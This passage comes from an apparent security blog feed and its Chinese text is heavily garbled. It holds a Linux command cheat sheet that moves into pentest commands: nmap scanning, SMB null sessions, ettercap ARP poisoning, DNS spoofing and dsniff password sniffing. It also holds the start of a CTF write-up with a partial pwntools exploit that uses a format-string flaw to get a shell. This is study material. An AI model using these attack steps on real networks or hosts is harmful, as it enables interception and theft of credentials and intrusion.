ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šdosæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§</code></pre><h2 id="åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"><a href="#åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"></a>åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</h2><pre class=" language-bash"><code class="language-bash"> mkfs /dev/hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ mke2fs /dev/hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªlinux ext2çš„æ–‡ä»¶ç³»ç»Ÿ mke2fs -j /dev/hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªlinux ext3<span class="token punctuation">(</span>æ—¥å¿—å‹<span class="token punctuation">)</span>çš„æ–‡ä»¶ç³»ç»Ÿ mkfs -t vfat 32 -F /dev/hda1 åˆ›å»ºä¸€ä¸ª FAT32 æ–‡ä»¶ç³»ç»Ÿ <span class="token function">fdformat</span> -n /dev/fd0 æ ¼å¼åŒ–ä¸€ä¸ªè½¯ç›˜ mkswap /dev/hda3 åˆ›å»ºä¸€ä¸ªswapæ–‡ä»¶ç³»ç»ŸSWAPæ–‡ä»¶ç³»ç»Ÿ mkswap /dev/hda3 åˆ›å»ºä¸€ä¸ªswapæ–‡ä»¶ç³»ç»Ÿ swapon /dev/hda3 å¯ç”¨ä¸€ä¸ªæ–°çš„swapæ–‡ä»¶ç³»ç»Ÿ swapon /dev/hda2 /dev/hdb3 å¯ç”¨ä¸¤ä¸ªswapåˆ†åŒº</code></pre><h2 id="å¤‡ä»½"><a href="#å¤‡ä»½" class="headerlink" title="å¤‡ä»½"></a>å¤‡ä»½</h2><pre class=" language-bash"><code class="language-bash">dump -0aj -f /tmp/home0.bak /home åˆ¶ä½œä¸€ä¸ª <span class="token string">'/home'</span> ç›®å½•çš„å®Œæ•´å¤‡ä»½ dump -1aj -f /tmp/home0.bak /home åˆ¶ä½œä¸€ä¸ª <span class="token string">'/home'</span> ç›®å½•çš„äº¤äº’å¼å¤‡ä»½ restore -if /tmp/home0.bak è¿˜åŸä¸€ä¸ªäº¤äº’å¼å¤‡ä»½ <span class="token function">rsync</span> -rogpav --delete /home /tmp åŒæ­¥ä¸¤è¾¹çš„ç›®å½• <span class="token function">rsync</span> -rogpav -e <span class="token function">ssh</span> --delete /home ip_address:/tmp é€šè¿‡SSHé€šé“rsync <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete ip_addr:/home/public /home/local é€šè¿‡sshå’Œå‹ç¼©å°†ä¸€ä¸ªè¿œç¨‹ç›®å½•åŒæ­¥åˆ°æœ¬åœ°ç›®å½• <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete /home/local ip_addr:/home/public é€šè¿‡sshå’Œå‹ç¼©å°†æœ¬åœ°ç›®å½•åŒæ­¥åˆ°è¿œç¨‹ç›®å½• <span class="token function">dd</span> bs<span class="token operator">=</span>1M if<span class="token operator">=</span>/dev/hda <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">|</span> <span class="token function">ssh</span> user@ip_addr <span class="token string">'dd of=hda.gz'</span> é€šè¿‡sshåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä¸€æ¬¡å¤‡ä»½æœ¬åœ°ç£ç›˜çš„æ“ä½œ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/sda of<span class="token operator">=</span>/tmp/file1 å¤‡ä»½ç£ç›˜å†…å®¹åˆ°ä¸€ä¸ªæ–‡ä»¶ <span class="token function">tar</span> -Puf backup.tar /home/user æ‰§è¡Œä¸€æ¬¡å¯¹ <span class="token string">'/home/user'</span> ç›®å½•çš„äº¤äº’å¼å¤‡ä»½æ“ä½œ <span class="token punctuation">(</span> <span class="token function">cd</span> /tmp/local/ <span class="token operator">&amp;&amp;</span> <span class="token function">tar</span> c <span class="token keyword">.</span> <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/share/ &amp;&amp; tar x -p'</span> é€šè¿‡sshåœ¨è¿œç¨‹ç›®å½•ä¸­å¤åˆ¶ä¸€ä¸ªç›®å½•å†…å®¹ <span class="token punctuation">(</span> <span class="token function">tar</span> c /home <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/backup-home &amp;&amp; tar x -p'</span> é€šè¿‡sshåœ¨è¿œç¨‹ç›®å½•ä¸­å¤åˆ¶ä¸€ä¸ªæœ¬åœ°ç›®å½• <span class="token function">tar</span> cf - <span class="token keyword">.</span> <span class="token operator">|</span> <span class="token punctuation">(</span>cd /tmp/backup <span class="token punctuation">;</span> <span class="token function">tar</span> xf - <span class="token punctuation">)</span> æœ¬åœ°å°†ä¸€ä¸ªç›®å½•å¤åˆ¶åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œä¿ç•™åŸæœ‰æƒé™åŠé“¾æ¥ <span class="token function">find</span> /home/user1 -name <span class="token string">'*.txt'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">cp</span> -av --target-directory<span class="token operator">=</span>/home/backup/ --parents ä»ä¸€ä¸ªç›®å½•æŸ¥æ‰¾å¹¶å¤åˆ¶æ‰€æœ‰ä»¥ <span class="token string">'.txt'</span> ç»“å°¾çš„æ–‡ä»¶åˆ°å¦ä¸€ä¸ªç›®å½• <span class="token function">find</span> /var/log -name <span class="token string">'*.log'</span> <span class="token operator">|</span> <span class="token function">tar</span> cv --files-from<span class="token operator">=</span>- <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token operator">></span> log.tar.bz2 æŸ¥æ‰¾æ‰€æœ‰ä»¥ <span class="token string">'.log'</span> ç»“å°¾çš„æ–‡ä»¶å¹¶åšæˆä¸€ä¸ªbzipåŒ… <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hda of<span class="token operator">=</span>/dev/fd0 bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 åšä¸€ä¸ªå°† MBR <span class="token punctuation">(</span>Master Boot Record<span class="token punctuation">)</span>å†…å®¹å¤åˆ¶åˆ°è½¯ç›˜çš„åŠ¨ä½œ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/fd0 of<span class="token operator">=</span>/dev/hda bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 ä»å·²ç»ä¿å­˜åˆ°è½¯ç›˜çš„å¤‡ä»½ä¸­æ¢å¤MBRå†…å®¹</code></pre><h2 id="å…‰ç›˜"><a href="#å…‰ç›˜" class="headerlink" title="å…‰ç›˜"></a>å…‰ç›˜</h2><pre class=" language-bash"><code class="language-bash">cdrecord -v gracetime<span class="token operator">=</span>2 dev<span class="token operator">=</span>/dev/cdrom -eject blank<span class="token operator">=</span>fast -force æ¸…ç©ºä¸€ä¸ªå¯å¤å†™çš„å…‰ç›˜å†…å®¹ <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">></span> cd.iso åœ¨ç£ç›˜ä¸Šåˆ›å»ºä¸€ä¸ªå…‰ç›˜çš„isoé•œåƒæ–‡ä»¶ <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">></span> cd_iso.gz åœ¨ç£ç›˜ä¸Šåˆ›å»ºä¸€ä¸ªå‹ç¼©äº†çš„å…‰ç›˜isoé•œåƒæ–‡ä»¶ <span class="token function">mkisofs</span> -J -allow-leading-dots -R -V <span class="token string">"Label CD"</span> -iso-level 4 -o ./cd.iso data_cd åˆ›å»ºä¸€ä¸ªç›®å½•çš„isoé•œåƒæ–‡ä»¶ cdrecord -v dev<span class="token operator">=</span>/dev/cdrom cd.iso åˆ»å½•ä¸€ä¸ªISOé•œåƒæ–‡ä»¶ <span class="token function">gzip</span> -dc cd_iso.gz <span class="token operator">|</span> cdrecord dev<span class="token operator">=</span>/dev/cdrom - åˆ»å½•ä¸€ä¸ªå‹ç¼©äº†çš„ISOé•œåƒæ–‡ä»¶ <span class="token function">mount</span> -o loop cd.iso /mnt/iso æŒ‚è½½ä¸€ä¸ªISOé•œåƒæ–‡ä»¶ cd-paranoia -B ä»ä¸€ä¸ªCDå…‰ç›˜è½¬å½•éŸ³è½¨åˆ° wav æ–‡ä»¶ä¸­ cd-paranoia -- <span class="token string">"-3"</span> ä»ä¸€ä¸ªCDå…‰ç›˜è½¬å½•éŸ³è½¨åˆ° wav æ–‡ä»¶ä¸­ï¼ˆå‚æ•°-3ï¼‰ cdrecord --scanbus æ‰«ææ€»çº¿ä»¥è¯†åˆ«scsié€šé“ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hdc <span class="token operator">|</span> md5sum æ ¡éªŒä¸€ä¸ªè®¾å¤‡çš„md5sumç¼–ç ï¼Œä¾‹å¦‚ä¸€å¼  CD</code></pre><h2 id="åº”ç”¨å‘½ä»¤"><a href="#åº”ç”¨å‘½ä»¤" class="headerlink" title="åº”ç”¨å‘½ä»¤"></a>åº”ç”¨å‘½ä»¤</h2><pre class=" language-bash"><code class="language-bash">whois åŸŸå/ip æŸ¥çœ‹åŸŸåçš„è¯¦ç»†ä¿¡æ¯ã€‚<span class="token function">ping</span> åŸŸå/ip æµ‹è¯•æœ¬æœºåˆ°è¿œç«¯ä¸»æœºæ˜¯å¦è”é€šã€‚<span class="token function">dig</span> åŸŸå/ip æŸ¥çœ‹åŸŸåè§£æçš„è¯¦ç»†ä¿¡æ¯ã€‚host -l åŸŸå dnsæœåŠ¡å™¨ ä¼ è¾“zoneã€‚</code></pre><h2 id="æ‰«ænmap"><a href="#æ‰«ænmap" class="headerlink" title="æ‰«ænmap"></a>æ‰«ænmap</h2><pre class=" language-bash"><code class="language-bash">-sS åŠå¼€æ‰«æTCPå’ŒSYNæ‰«æã€‚-sT å®Œå…¨TCPè¿æ¥æ‰«æã€‚-sU UDPæ‰«æ-PS synåŒ…æ¢æµ‹<span class="token punctuation">(</span>é˜²ç«å¢™æ¢æµ‹<span class="token punctuation">)</span>-PA ackåŒ…æ¢æµ‹<span class="token punctuation">(</span>é˜²ç«å¢™æ¢æµ‹<span class="token punctuation">)</span>-PN ä¸pingã€‚-n ä¸dnsè§£æã€‚-A -Oå’Œ-sVã€‚-O æ“ä½œç³»ç»Ÿè¯†åˆ«ã€‚-sV æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯<span class="token punctuation">(</span>banner<span class="token punctuation">)</span>-p ç«¯å£æ‰«æã€‚-T è®¾ç½®æ—¶é—´çº§åˆ«<span class="token punctuation">(</span>0-5<span class="token punctuation">)</span>-iL å¯¼å…¥æ‰«æç»“æœã€‚-oG è¾“å‡ºæ‰«æç»“æœã€‚æ“ä½œç³»ç»Ÿè¯†åˆ«:p0f -i eth0 -U -p å¼€å¯æ··æ‚æ¨¡å¼ã€‚xprobe2 ip<span class="token operator">|</span>åŸŸå æ£€æµ‹osã€‚bannerè·å–:nc ip port æ£€æµ‹ç«¯å£æ˜¯å¦æ‰“å¼€ã€‚telnet ip port æ£€æµ‹ç«¯å£æ˜¯å¦æ‰“å¼€ã€‚<span class="token function">wget</span> ip ä¸‹è½½ä¸»é¡µã€‚<span class="token function">cat</span> index.html <span class="token operator">|</span> <span class="token function">more</span> æ˜¾ç¤ºä¸»é¡µä»£ç ã€‚q é€€å‡ºã€‚windowsæšä¸¾nmap -sS -p 139,445 ip æ‰«æwindowsã€‚<span class="token function">cd</span> /pentest/enumeration/smb-enumnbtscan -f targetIP æ£€æµ‹netbiosã€‚smbgetserverinfo -i targetIP æ‰«æname,os,ç»„ã€‚smbdumpusers -i targetIP åˆ—å‡ºç”¨æˆ·ã€‚smbclient -L //targetIP åˆ—å‡ºå…±äº«ã€‚ä½¿ç”¨windows:net use \\ipipc$ <span class="token string">""</span> /u:<span class="token string">""</span> å¼€å¯ç©ºä¼šè¯ã€‚net view \\ip æ˜¾ç¤ºå…±äº«ä¿¡æ¯ã€‚smbclient:smbclient -L hostName -I targetIP æšä¸¾å…±äº«ã€‚smbclient -L hostName/share -U <span class="token string">""</span> ç”¨ç©ºç”¨æˆ·è¿æ¥ã€‚smbclient -L hostName -I targetIP -U adminæ™®é€šç”¨æˆ·è¿æ¥ã€‚rpcclient:rpcclient targetIP -U â€œâ€æ‰“å¼€ä¸€ä¸ªç©ºä¼šè¯ã€‚netshareenum æšä¸¾å…±äº«ã€‚enumdomusers æšä¸¾ç”¨æˆ·ã€‚lsaenumsid æšä¸¾åŸŸSIDã€‚queryuser RID æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ã€‚createdomuser åˆ›å»ºç”¨æˆ·è®¿é—®ã€‚</code></pre><h2 id="ARPæ¬ºéª—"><a href="#ARPæ¬ºéª—" class="headerlink" title="ARPæ¬ºéª—"></a>ARPæ¬ºéª—</h2><pre class=" language-bash"><code class="language-bash">ettercap:<span class="token function">nano</span> /usr/local/etc/etter.confé…ç½®æ–‡ä»¶Sniff <span class="token operator">></span> Unified sniffing <span class="token operator">></span> Network interface: eth0 <span class="token operator">></span> OK è®¾ç½®æŠ“åŒ…çš„ç½‘å¡Hosts <span class="token operator">></span> Scan <span class="token keyword">for</span> hosts <span class="token punctuation">(</span>do this two times<span class="token punctuation">)</span>æ‰«æç½‘æ®µçš„ä¸»æœºHosts <span class="token operator">></span> Hosts list æ˜¾ç¤ºä¸»æœºåˆ—è¡¨Select the default gateway <span class="token operator">></span> Add to Target 1 æ·»åŠ ä¸»æœºSelect the target <span class="token operator">></span> Add to Target 2 æ·»åŠ ä¸»æœºMitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK è®¾ç½®ARPæ”»å‡»Start <span class="token operator">></span> Start sniffing å¼€å§‹æ”»å‡»dsniff -i eth0 ç›‘å¬ç½‘å¡çªƒå¬ç™»å½•ç”¨æˆ·å¯†ç urlsnarf -i eth0 å—…æ¢httpè¯·æ±‚msgsnarf -i eth0 å—…æ¢èŠå¤©è½¯ä»¶çš„èŠå¤©å†…å®¹driftnet -i eth0 ç½‘ç»œç®¡ç†å—…æ¢å›¾ç‰‡ï¼ŒéŸ³é¢‘ã€‚dnsæ¬ºéª—:<span class="token function">nano</span> /usr/local/share/ettercap/etter.dnsç¼–è¾‘é…ç½®æ–‡ä»¶Plugins <span class="token operator">></span> Manage the plugins <span class="token operator">></span> dns_spoof è®¾ç½®dnsæ¬ºéª—Mitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK è®¾ç½®ARPStart <span class="token operator">></span> Start sniffing å¼€å§‹æ”»å‡»</code></pre><h2 id="Exploitsæ¼æ´åˆ©ç”¨"><a href="#Exploitsæ¼æ´åˆ©ç”¨" class="headerlink" title="Exploitsæ¼æ´åˆ©ç”¨"></a>Exploitsæ¼æ´åˆ©ç”¨</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /pentest/exploits/exploit-db è¿›å…¥ç›®å½•<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i <span class="token punctuation">[</span>exploit<span class="token punctuation">]</span> æŸ¥è¯¢éœ€è¦çš„æ¼æ´<span class="token function">cat</span> exploit <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"#include"</span>æ£€æŸ¥è¿è¡Œç¯å¢ƒ<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i exploit <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">" "</span> -f1 <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> sys <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">":"</span> -f1 <span class="token operator">|</span> <span class="token function">sort</span> -uåªä¿ç•™å¯ä»¥åœ¨linuxä¸‹è¿è¡Œçš„ä»£ç Metasploit:svn update å‡çº§./msfweb Webæ¥å£127.0.0.1:55555ã€‚../msfconsole å­—ç¬¦ä¸‹çš„Consoleã€‚<span class="token function">help</span> å¸®åŠ©show æ˜¾ç¤ºé€‰é¡¹ searc</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;dev-null&quot;&gt;&lt;a href=&quot;#dev-null&quot; class=&quot;headerlink&quot; title=&quot;/dev/null&quot;&gt;&lt;/a&gt;/dev/null&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;ğŸ˜­å› ä¸ºå¿˜äº†å‚è€ƒäº†å“ªäº›æ–‡ç« ï¼Œæ‰€ä»¥å¦‚è‹¥
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.yof3ng.xyz/categories/Linux/"/>
    
    
      <category term="Linuxé‡å®šå‘" scheme="http://www.yof3ng.xyz/tags/Linux%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    
      <category term="å¸¸ç”¨å‘½ä»¤é›†" scheme="http://www.yof3ng.xyz/tags/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10æœˆ31-Hitcon-äº”</title>
    <link href="http://www.yof3ng.xyz/2018/10/31/Pwn-10%E6%9C%8831-Hitcon-%E4%BA%94/"/>
    <id>http://www.yof3ng.xyz/2018/10/31/Pwn-10æœˆ31-Hitcon-äº”/</id>
    <published>2018-10-31T12:44:52.000Z</published>
    <updated>2018-11-02T14:23:17.654Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-åæœˆ31-Hitcon-äº”"><a href="#Pwn-åæœˆ31-Hitcon-äº”" class="headerlink" title="Pwn-åæœˆ31-Hitcon-äº”"></a>Pwn-åæœˆ31-Hitcon-äº”</h1><blockquote><p>é¸½äº†å‡ å¤©ä¹‹åï¼Œç»§ç»­ç»ƒä¹ HitconğŸ˜­ğŸ†’ã€‚</p></blockquote><h2 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9-playfmt"></a>lab9-playfmt</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; åŒæ ·ï¼Œè¿™ä¸€é¢˜ä¹Ÿæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯è¿™é¢˜çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šï¼Œè€Œæ˜¯åœ¨å…¨å±€å˜é‡ï¼ˆ.bss)æ®µï¼Ÿï¼Ÿï¼Ÿä»€ä¹ˆæƒ…å†µğŸ™ƒã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ‰€ä»¥è¿™é¢˜æˆ‘ä»¬ä¸èƒ½ç›´æ¥é€šè¿‡æ§åˆ¶æ ˆä¸Šå˜é‡æ¥ä¿®æ”¹Gotè¡¨ï¼Œé‚£æ„æ€æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±å¯ä»¥é€šè¿‡é—´æ¥çš„æ–¹å¼æ¥ä¿®æ”¹Gotè¡¨å†…å®¹å’¯ã€‚</p></blockquote><h3 id="æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec playfmt</code>:</p><p><img src="https://i.loli.net/2018/10/31/5bd9a7693eb66.png" alt=""></p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ç®€å•è¿è¡Œä¸€ä¸‹ç¨‹åºå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡çš„printfå‡½æ•°bufä¸åœ¨æ ˆä¸Šï¼Œè€Œæ˜¯åœ¨bssæ®µã€‚</p></blockquote><p><img src="https://i.loli.net/2018/10/31/5bd9a9c834154.png" alt=""></p><p>IDAçœ‹ä¸€çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/31/5bd9ab6a202f0.png" alt=""></p><p>çš„ç¡®æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ï¼Œå¾ˆæ˜æ˜¾å’¯ã€‚</p><p><img src="https://i.loli.net/2018/10/31/5bd9accfc0a7b.png" alt=""></p><p>ç”¨gdbè°ƒè¯•ï¼Œå¹¶ä¸”è¾“å…¥4ä¸ªaï¼Œå¯ä»¥çœ‹åˆ°bufä¸åœ¨æ ˆä¸Šã€‚</p><blockquote><p> å¼•ç”¨å¤§ä½¬çš„è¯ï¼š<code>é€šè¿‡ä¿®æ”¹æ ˆä¸­å­˜åœ¨çš„æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘æ ˆä¸Šçš„å˜é‡ï¼Œå¯ä»¥é—´æ¥åœ°å®ç°å†™gotï¼Œè¿™ç§æ–¹å¼æ˜¯ä¸€ç§å¸¸è§çš„å¥—è·¯ã€‚</code></p><p> c/c++ä¸­çš„<code>%n</code>æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œå®ƒæ˜¯è¾“å…¥æ ¼å¼åŒ–æ§åˆ¶å­—ç¬¦ï¼Œåœ¨è¿™é¢˜ä¸­å¯ä»¥ç”¨äºä¿®æ”¹æ ˆä¸­å˜é‡çš„å€¼ã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥åœ¨printfå‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹æ ˆä¸­å˜é‡æƒ…å†µï¼š</p><p><img src="https://i.loli.net/2018/10/31/5bd9b9c7dc455.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; å¯ä»¥çœ‹åˆ°åç§»é‡ä¸º6çš„åœ°æ–¹æ˜¯ebpï¼Œè€ŒebpæŒ‡å‘äº†å¦å¤–ä¸€ä¸ªåœ°å€ï¼Œå³åç§»é‡ä¸º10çš„åœ°æ–¹ï¼Œç„¶ååˆæŒ‡å‘åç§»é‡ä¸º15çš„ä½ç½®ã€‚è¿™é‡Œæˆ‘ä»¬å…¶å®å¯ä»¥èµ°ä¸€æ­¥æ·å¾„ï¼Œé€šè¿‡è·å¾—åç§»é‡ä¸º8çš„åœ°æ–¹è¿™ä¸ªå‡½æ•°åœ°å€ï¼Œleakå‡ºlibcåŸºåœ°å€ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ­£æ˜¯å› ä¸ºç¨‹åºæ˜¯å¾ªç¯è¿è¡Œï¼Œæ‰€ä»¥ç»™äº†æˆ‘ä»¬è¶³å¤Ÿå¤šæ¬¡æ•°æ¥é—´æ¥è¦†å†™GOTè¡¨ã€‚</p><blockquote><p> è§£é¢˜é€»è¾‘ï¼ˆ<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">æ¥è‡ª23r3f</a> ï¼‰ï¼š</p><pre class=" language-python"><code class="language-python"> ebp_1 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">6</span><span class="token punctuation">,</span> å³$ebp ebp_2 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">10</span><span class="token punctuation">,</span> å³$ebpçš„å€¼åœ°å€ fmt_7 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">7</span> fmt_11 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">11</span></code></pre><p> &nbsp; &nbsp; &nbsp; &nbsp; ebp1çš„å†…å®¹æ˜¯æŒ‡å‘ebp2çš„åœ°å€çš„æŒ‡é’ˆï¼Œè€Œebp2çš„å†…å®¹åˆæ˜¯æŒ‡å‘å…¶ä»–åœ°å€çš„æŒ‡é’ˆï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬ç”¨%nå¯¹ebp1è¿›è¡Œæ“ä½œï¼Œé‚£ä¹ˆå®é™…ä¸Šä¼šä¿®æ”¹ebp2çš„å€¼ï¼Œå¦‚æœæ­¤æ—¶å†æŠŠebp2çš„å†…å®¹æ”¹æˆä¸€ä¸ªæŒ‡å‘fmt7çš„æŒ‡é’ˆï¼Œç„¶ååœ¨å¯¹ebp2è¿›è¡Œ%næ“ä½œï¼Œé‚£ä¹ˆå°±å¯ä»¥æ”¹å˜fmt7çš„å†…å®¹ï¼Œä»è€Œå®ç°äº†é—´æ¥ä¿®æ”¹æŸä¸ªåœ°å€çš„å†…å®¹ï¼Œè¯•æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬æŠŠfmt7çš„å†…å®¹åˆæ”¹æˆprintfçš„gotè¡¨åœ°å€ï¼Œé‚£ä¹ˆfmt7å°±æŒ‡å‘äº†printf_gotçš„åœ°å€ï¼Œå¦‚æœç”¨%sæ“ä½œï¼Œå°±å¯ä»¥æŠŠprintf_gotçš„å†…å®¹æ‰“å°å‡ºæ¥ï¼Œä»è€Œå¾—åˆ°äº†printfå‡½æ•°çš„çœŸæ­£åœ°å€ï¼Œåˆ°äº†è¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡printfå‡½æ•°æ³„æ¼å‡ºsystemçš„çœŸæ­£åœ°å€äº†ã€‚</p><p> å…·ä½“æ€è·¯ï¼š</p><pre class=" language-python"><code class="language-python"> <span class="token number">1</span><span class="token punctuation">.</span>é€šè¿‡ebp_1ä½¿ebp_2æŒ‡å‘fmt_7 <span class="token number">2</span><span class="token punctuation">.</span>é€šè¿‡ebp_2å°†fmt_7å¤„çš„å†…å®¹è¦†ç›–æˆprintf_got <span class="token number">3</span><span class="token punctuation">.</span>é€šè¿‡ebp_1ä½¿ebp_2æŒ‡å‘fmt_11 <span class="token number">4</span><span class="token punctuation">.</span>é€šè¿‡ebp_2å°†fmt_11å¤„çš„å†…å®¹ä¿®æ”¹æˆprintf_got<span class="token operator">+</span><span class="token number">2</span> <span class="token number">5</span><span class="token punctuation">.</span>é€šè¿‡fmt_7å°†printf_gotåœ°å€æ³„éœ²å‡ºæ¥ <span class="token number">6</span><span class="token punctuation">.</span>è®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€ <span class="token punctuation">,</span>å°†systemå‡½æ•°åœ°å€å†™å…¥printfåœ¨gotè¡¨çš„åœ°å€ å…·ä½“åšæ³•æ˜¯å°† systemå‡½æ•°åœ°å€çš„å‰ä¸¤ä¸ªå­—èŠ‚å†™å…¥fmt_7<span class="token punctuation">,</span>åä¸¤ä¸ªå­—èŠ‚å†™å…¥ fmt_11 <span class="token number">7</span><span class="token punctuation">.</span>æ‰§è¡Œprintfå‡½æ•°ç›¸å½“äºæ‰§è¡Œsystemå‡½æ•° <span class="token number">8</span><span class="token punctuation">.</span>è¾“å…¥<span class="token string">"/bin/sh"</span>å­—ç¬¦ä¸²ï¼Œè®©systemå‡½æ•°ä»æ ˆä¸­å–å‚æ•°getshell</code></pre></blockquote><p>æ¥ä¸‹æ¥ç›´æ¥é€šè¿‡ç†è§£å„ä½å¤§ä½¬expçš„æ–¹å¼ï¼Œæ¥æ·±å…¥ç†è§£è¿™ä¸€é“é¢˜ï¼ˆå¤ªèœäº†æˆ‘ï¼‰ã€‚</p><h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><p>ä¸‰ä»½å¤§ä½¬EXPå„æœ‰ä¸åŒæŠ€å·§ï¼šåˆ†åˆ«æ¥è‡ªM4xï¼Œ23r3fï¼Œveritas501</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>__Auther__ <span class="token operator">=</span> <span class="token string">'M4x'</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Breakpoint *do_fmt+64pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    